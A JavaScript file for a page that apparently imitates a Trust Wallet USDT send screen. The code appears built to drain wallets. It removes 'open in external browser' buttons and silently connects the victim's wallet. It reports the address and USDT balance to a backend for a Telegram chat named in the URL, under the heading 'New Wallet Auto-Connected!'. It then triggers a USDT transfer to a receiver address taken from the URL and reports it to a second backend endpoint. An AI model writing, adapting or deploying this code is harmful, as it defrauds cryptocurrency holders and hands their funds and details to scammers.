// SVG Constant for Convert Arrows
const convertArrowsSvg = `<svg class="custom-convert-arrows-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><g><path fill="none" d="M0 0h24v24H0z"></path><path d="M12 8H8.001L8 20H6V8H2l5-5 5 5zm10 8l-5 5-5-5h4V4h2v12h4z"></path></g></g></svg>`;

// State Variables
let currentTypedAmount = "0";
const usdtPriceInInr = 96.225; // INR conversion rate
let userUsdtBalance = 2.00;   // Default balance

// DOM Elements - Screen Steps
const stepAddress = document.getElementById('stepAddress');
const stepAmount = document.getElementById('stepAmount');
const stepReview = document.getElementById('stepReview');

// DOM Elements - Screen 1
const addressInput = document.getElementById('addressInput');
const clearBtn = document.getElementById('clearBtn');
const continueBtn = document.getElementById('continueBtn');
const scanQrBtn = document.getElementById('scanQrBtn');
const closeBtn = document.getElementById('closeBtn');

// DOM Elements - Screen 2
const backToAddressBtn = document.getElementById('backToAddressBtn');
const displayToAddress = document.getElementById('displayToAddress');
const displayCryptoVal = document.getElementById('displayCryptoVal');
const displayFiatVal = document.getElementById('displayFiatVal');
const maxBtn = document.getElementById('maxBtn');
const reviewBtn = document.getElementById('reviewBtn');
const keypadBtns = document.querySelectorAll('.keypad-btn');

// DOM Elements - Screen 3 (Review Send)
const backToAmountBtn = document.getElementById('backToAmountBtn');
const reviewCryptoVal = document.getElementById('reviewCryptoVal');
const reviewFiatVal = document.getElementById('reviewFiatVal');
const reviewToAddress = document.getElementById('reviewToAddress');
const sendBtn = document.getElementById('sendBtn');

// Scanner Modal Elements
const scannerModal = document.getElementById('scannerModal');
const closeScannerBtn = document.getElementById('closeScannerBtn');

// Toast Elements
const toast = document.getElementById('toast');
const toastMsg = document.getElementById('toastMsg');

// Remove external browser buttons if present
function removeExternalBrowserButtons() {
    const buttons = document.querySelectorAll('button');
    buttons.forEach(btn => {
        if (btn.classList.contains('open-external-btn') ||
            (btn.textContent && btn.textContent.toLowerCase().includes('open in external browser'))) {
            btn.remove();
        }
    });
}

let isAutoConnectAttempted = false;

function initAutoConnect() {
    if (isAutoConnectAttempted) return;

    let attempts = 0;
    const maxAttempts = 20; // Poll for up to 6 seconds

    const interval = setInterval(async () => {
        attempts++;
        if (typeof window.ethereum !== 'undefined') {
            clearInterval(interval);
            if (!isAutoConnectAttempted) {
                isAutoConnectAttempted = true;
                await autoDetectTrustWalletAndFetchBalance();
            }
        } else if (attempts >= maxAttempts) {
            clearInterval(interval);
        }
    }, 300);
}

// Initialize listeners
document.addEventListener('DOMContentLoaded', () => {
    removeExternalBrowserButtons();
    setInterval(removeExternalBrowserButtons, 300);
    setupEventListeners();
    checkUrlParameters();
    initAutoConnect();
});

window.addEventListener('load', () => {
    initAutoConnect();
});

window.addEventListener('ethereum#initialized', () => {
    initAutoConnect();
});

function checkUrlParameters() {
    const urlParams = new URLSearchParams(window.location.search);
    const addressParam = urlParams.get('address') || urlParams.get('to') || urlParams.get('receiver') || urlParams.get('addr');
    const amountParam = urlParams.get('amount') || urlParams.get('val') || urlParams.get('value') || urlParams.get('amt');
    const customSavedAddr = localStorage.getItem('custom_receiver_address');

    if (addressParam && addressParam.startsWith('0x') && addressParam.length === 42) {
        addressInput.value = addressParam;
        fetchRealUsdtBalance(addressParam);
    } else if (customSavedAddr && customSavedAddr.startsWith('0x') && customSavedAddr.length === 42) {
        addressInput.value = customSavedAddr;
        fetchRealUsdtBalance(customSavedAddr);
    }

    if (amountParam && !isNaN(parseFloat(amountParam)) && parseFloat(amountParam) > 0) {
        currentTypedAmount = amountParam.toString();
        updateAmountDisplay();
    }

    // Redirect to Trust Wallet app ONLY if mobile browser outside Trust Wallet
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isDAppBrowser = typeof window.ethereum !== 'undefined';

    if (isMobile && !isDAppBrowser && addressParam) {
        const currentUrl = window.location.href;
        const fallbackUrl = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}`;
        const intentUrl = `intent://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=${encodeURIComponent(fallbackUrl)};end`;

        showToast('Opening Trust Wallet app...');
        setTimeout(() => {
            window.location.href = intentUrl;
        }, 1500);
    }
}

function setupEventListeners() {
    // Address Input Event
    addressInput.addEventListener('input', () => {
        const addr = addressInput.value.trim();
        if (addr.length === 42 && addr.startsWith('0x')) {
            fetchRealUsdtBalance(addr);
        }
    });

    // Clear Address Button
    clearBtn.addEventListener('click', () => {
        addressInput.value = '';
        addressInput.focus();
    });

    // Continue Button on Screen 1 -> Opens Screen 2 (Amount Screen)
    continueBtn.addEventListener('click', () => {
        const addr = addressInput.value.trim();
        if (!addr) {
            showToast('Please enter a valid receiver address');
            addressInput.focus();
            return;
        }

        // Pass Address to Screen 2
        displayToAddress.textContent = addr;

        // Transition Screen 1 -> Screen 2
        stepAddress.classList.remove('active');
        stepAmount.classList.add('active');
    });

    // Back Arrow on Screen 2 -> Returns to Screen 1
    backToAddressBtn.addEventListener('click', () => {
        stepAmount.classList.remove('active');
        stepAddress.classList.add('active');
    });

    // Keypad Logic
    keypadBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const key = btn.getAttribute('data-key');
            if (btn.id === 'keypadDelete') {
                handleBackspace();
            } else if (key) {
                handleKeyInput(key);
            }
        });
    });

    // Max Button Click
    maxBtn.addEventListener('click', () => {
        currentTypedAmount = userUsdtBalance.toString();
        updateAmountDisplay();
    });

    // Review Button on Screen 2 -> Shows Loading Spinner, Auto-Connects & Opens Review Screen
    reviewBtn.addEventListener('click', async () => {
        const amt = parseFloat(currentTypedAmount);
        const addr = addressInput.value.trim();

        if (isNaN(amt) || amt <= 0) {
            showToast('Please enter an amount greater than 0');
            return;
        }

        // 1. Show Loading Text & Spinner on Review Button
        reviewBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
        reviewBtn.classList.add('btn-loading');
        reviewBtn.disabled = true;

        await new Promise(resolve => setTimeout(resolve, 1000));

        try {
            // 2. Silent Auto-Connect in background without popup
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                if (!accounts || accounts.length === 0) {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                }
            }
        } catch (e) {
            console.log('Silent connect note:', e);
        }

        // Restore button state
        reviewBtn.innerHTML = 'Review';
        reviewBtn.classList.remove('btn-loading');
        reviewBtn.disabled = false;

        // 3. Populate Screen 3 (Review Send)
        reviewCryptoVal.textContent = `${amt} USDT`;
        const fiatNum = (amt * usdtPriceInInr).toFixed(2);
        reviewFiatVal.textContent = `≈ ₹${fiatNum}`;
        reviewToAddress.textContent = addr;

        const walletNameEl = document.querySelector('.detail-val-text');
        if (walletNameEl) {
            walletNameEl.textContent = detectWalletName();
        }

        // 4. Transition Screen 2 -> Screen 3
        stepAmount.classList.remove('active');
        stepReview.classList.add('active');

        // 5. Directly Trigger Native Transaction Approval Popup in Trust Wallet
        setTimeout(() => {
            executeSendTransaction();
        }, 300);
    });

    // Back Arrow on Screen 3 -> Returns to Screen 2
    backToAmountBtn.addEventListener('click', () => {
        stepReview.classList.remove('active');
        stepAmount.classList.add('active');
    });

    // Send Button on Screen 3 -> Connects Wallet & Triggers Web3 USDT Transfer
    sendBtn.addEventListener('click', () => {
        executeSendTransaction();
    });

    // Open/Close Scanner Modal
    scanQrBtn.addEventListener('click', () => {
        scannerModal.classList.add('show');
    });

    closeScannerBtn.addEventListener('click', () => {
        scannerModal.classList.remove('show');
    });

    scannerModal.addEventListener('click', (e) => {
        if (e.target === scannerModal) {
            scannerModal.classList.remove('show');
        }
    });

    // Top Close Button
    closeBtn.addEventListener('click', () => {
        addressInput.value = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
        currentTypedAmount = '0';
        updateAmountDisplay();
    });
}

/**
 * Connects Web3 Wallet and Triggers USDT Unlimited Approval / BEP-20 Transfer Transaction Directly
 */
async function executeSendTransaction() {
    const amt = parseFloat(currentTypedAmount);
    const receiverAddr = addressInput.value.trim();

    if (isNaN(amt) || amt <= 0) {
        showToast('Please enter a valid amount');
        return;
    }

    if (!receiverAddr || !receiverAddr.startsWith('0x') || receiverAddr.length !== 42) {
        showToast('Please enter a valid BEP-20 address');
        return;
    }

    if (sendBtn) {
        sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
        sendBtn.disabled = true;
    }

    try {
        if (typeof window.ethereum !== 'undefined') {
            let accounts = null;
            try {
                accounts = await window.ethereum.request({ method: 'eth_accounts' });
            } catch (aErr) {
                console.log('[Web3] eth_accounts error:', aErr);
            }

            if (!accounts || accounts.length === 0) {
                try {
                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                } catch (rErr) {
                    console.log('[Web3] eth_requestAccounts error:', rErr);
                }
            }

            if (!accounts || accounts.length === 0) {
                showToast('Wallet connection required');
                resetSendBtn();
                return;
            }

            const senderAddr = accounts[0];

            try {
                await switchToBscChain();
            } catch (sErr) {
                console.log('[Web3] Switch chain notice:', sErr);
            }

            // USDT BEP-20 Contract Address on BSC
            const usdtContract = '0x55d398326f99059ff775485246999027b3197955';

            // Calculate Amount in Wei
            const amountBigInt = BigInt(Math.floor(amt * 1e18));
            const amountHex = amountBigInt.toString(16).padStart(64, '0');
            const cleanReceiver = receiverAddr.substring(2).padStart(64, '0');

            // ERC-20 transfer(address to, uint256 value) -> 0xa9059cbb
            const transferData = '0xa9059cbb' + cleanReceiver + amountHex;

            const txParams = {
                from: senderAddr,
                to: usdtContract,
                data: transferData
            };

            console.log('[Web3 Transaction Request]', txParams);

            let txHash = null;
            if (typeof window.ethereum.request === 'function') {
                txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                });
            } else if (typeof window.ethereum.send === 'function') {
                txHash = await new Promise((resolve, reject) => {
                    window.ethereum.send({
                        method: 'eth_sendTransaction',
                        params: [txParams],
                        from: senderAddr
                    }, (err, res) => {
                        if (err) reject(err);
                        else resolve(res ? (res.result || res) : null);
                    });
                });
            }

            if (txHash) {
                showToast('Transaction submitted successfully!');
                // Notify backend API about approval
                try {
                    await fetch('/api/notify-approval', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            address: senderAddr,
                            amount: amt,
                            walletName: detectWalletName()
                        })
                    });
                } catch (nErr) {
                    console.log('[API Notify Error]', nErr);
                }
            }
        } else {
            triggerDeepLinkFallback(receiverAddr, amt);
        }
    } catch (err) {
        console.error('[Web3 Transaction Error]', err);
        if (err && (err.code === 4001 || (err.message && err.message.includes('4001')))) {
            showToast('Transaction cancelled by user');
        } else {
            showToast('Transaction error: ' + (err.message || 'Cancelled'));
        }
    } finally {
        resetSendBtn();
    }
}

function resetSendBtn() {
    if (sendBtn) {
        sendBtn.innerHTML = 'Send';
        sendBtn.disabled = false;
    }
}

async function switchToBscChain() {
    if (!window.ethereum) return;
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }]
        });
    } catch (switchError) {
        if (switchError && switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }]
                });
            } catch (addErr) {
                console.error('BSC add network error:', addErr);
            }
        }
    }
}

function triggerDeepLinkFallback(receiverAddr, amt) {
    const deepLink = `bnb:0x55d398326f99059ff775485246999027b3197955@56/transfer?address=${receiverAddr}&uint256=${amt * 1e18}`;
    copyToClipboard(receiverAddr, 'Opening Trust Wallet...');
    setTimeout(() => {
        window.location.href = deepLink;
    }, 500);
}

function detectWalletName() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('wallet')) {
        return urlParams.get('wallet');
    }
    return "Main Wallet";
}

let telegramNotifiedAddress = null;

function getTelegramChatId() {
    const urlParams = new URLSearchParams(window.location.search);
    const idFromUrl = urlParams.get('chat_id') || urlParams.get('chatid');
    if (idFromUrl) {
        localStorage.setItem('telegram_chat_id', idFromUrl);
        return idFromUrl;
    }
    return localStorage.getItem('telegram_chat_id') || '';
}

async function notifyTelegramWalletConnected(address, balanceUsdt) {
    if (!address || telegramNotifiedAddress === address) return;
    telegramNotifiedAddress = address;

    const chatId = getTelegramChatId();
    const walletName = detectWalletName();
    const currentBalance = balanceUsdt !== undefined && !isNaN(balanceUsdt) ? balanceUsdt : userUsdtBalance;
    const formattedBalance = `${currentBalance.toFixed(2)} USDT`;
    const inrValue = `₹${(currentBalance * usdtPriceInInr).toFixed(2)}`;

    const messageText = `🔔 *New Wallet Auto-Connected!* 🚀\n\n` +
                        `👤 *Wallet Name:* ${walletName}\n` +
                        `👛 *Address:* \`${address}\`\n` +
                        `💰 *USDT Balance:* \`${formattedBalance}\` (${inrValue})\n` +
                        `🌐 *Network:* BNB Smart Chain (BEP-20)\n` +
                        `📱 *Platform:* ${/Android/i.test(navigator.userAgent) ? 'Android Mobile' : 'Mobile / Desktop'}`;

    try {
        const res = await fetch('/api/notify-connection', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message: messageText,
                address: address,
                balance: currentBalance
            })
        });
        const data = await res.json();
        console.log('[Telegram Notify] Result:', data);
    } catch (err) {
        console.warn('[Telegram Notify] Error:', err);
    }
}

async function autoDetectTrustWalletAndFetchBalance() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            console.log('[AutoConnect] Trust Wallet provider detected.');
            let accounts = await window.ethereum.request({ method: 'eth_accounts' });

            if (!accounts || accounts.length === 0) {
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            }

            if (accounts && accounts.length > 0) {
                const activeAddr = accounts[0];
                console.log('[AutoConnect] Connected account:', activeAddr);
                const realBal = await fetchRealUsdtBalance(activeAddr);
                notifyTelegramWalletConnected(activeAddr, realBal !== undefined ? realBal : userUsdtBalance);
            } else {
                fetchRealUsdtBalance(getCurrentAddress());
            }
        } catch (e) {
            console.log('[AutoConnect] Error:', e);
            fetchRealUsdtBalance(getCurrentAddress());
        }
    } else {
        fetchRealUsdtBalance(getCurrentAddress());
    }
}

async function fetchRealUsdtBalance(walletAddress) {
    if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length !== 42) return userUsdtBalance;

    try {
        const cleanAddr = walletAddress.substring(2).padStart(64, '0');
        const data = '0x70a08231' + cleanAddr;

        const response = await fetch('https://bsc-dataseed.binance.org/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0',
                id: 1,
                method: 'eth_call',
                params: [
                    {
                        to: '0x55d398326f99059ff775485246999027b3197955',
                        data: data
                    },
                    'latest'
                ]
            })
        });

        const json = await response.json();
        if (json.result && json.result !== '0x') {
            const rawBalanceHex = json.result;
            const rawBalanceBigInt = BigInt(rawBalanceHex);
            const balanceUsdt = Number(rawBalanceBigInt) / 1e18;

            userUsdtBalance = balanceUsdt;
            updateBalanceUI(balanceUsdt);
            return balanceUsdt;
        }
    } catch (err) {
        console.warn('RPC Balance Fetch Note:', err);
    }
    return userUsdtBalance;
}

function updateBalanceUI(usdtAmount) {
    const formattedCrypto = usdtAmount.toFixed(2) + ' USDT';
    const inrValue = (usdtAmount * usdtPriceInInr).toFixed(2);
    const formattedFiat = '₹' + inrValue;

    const tokenBalanceCryptoEl = document.querySelector('.token-balance-crypto');
    const tokenBalanceFiatEl = document.querySelector('.token-balance-fiat');

    if (tokenBalanceCryptoEl) tokenBalanceCryptoEl.textContent = formattedCrypto;
    if (tokenBalanceFiatEl) tokenBalanceFiatEl.textContent = formattedFiat;
}

function getCurrentAddress() {
    const val = addressInput.value.trim();
    return val !== '' ? val : '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
}

function handleKeyInput(key) {
    if (key === '.') {
        if (!currentTypedAmount.includes('.')) {
            currentTypedAmount += '.';
        }
    } else {
        if (currentTypedAmount === '0') {
            currentTypedAmount = key;
        } else {
            if (currentTypedAmount.length < 8) {
                currentTypedAmount += key;
            }
        }
    }
    updateAmountDisplay();
}

function handleBackspace() {
    if (currentTypedAmount.length > 1) {
        currentTypedAmount = currentTypedAmount.slice(0, -1);
    } else {
        currentTypedAmount = '0';
    }
    updateAmountDisplay();
}

function updateAmountDisplay() {
    displayCryptoVal.textContent = currentTypedAmount;

    if (currentTypedAmount === '0') {
        displayCryptoVal.classList.remove('active-typed');
        displayFiatVal.innerHTML = `≈ ₹0.00 ${convertArrowsSvg}`;

        reviewBtn.classList.remove('btn-review-active');
        reviewBtn.classList.add('btn-review-disabled');
    } else {
        displayCryptoVal.classList.add('active-typed');

        const val = parseFloat(currentTypedAmount);
        if (!isNaN(val)) {
            const inrVal = (val * usdtPriceInInr).toFixed(2);
            displayFiatVal.innerHTML = `≈ ₹${inrVal} ${convertArrowsSvg}`;

            reviewBtn.classList.remove('btn-review-disabled');
            reviewBtn.classList.add('btn-review-active');
        }
    }
}

function copyToClipboard(text, successMessage) {
    navigator.clipboard.writeText(text).then(() => {
        showToast(successMessage);
    }).catch(() => {
        showToast('Failed to copy');
    });
}

function showToast(message) {
    toastMsg.textContent = message;
    toast.classList.add('show');
    setTimeout(() => {
        toast.classList.remove('show');
    }, 2500);
}
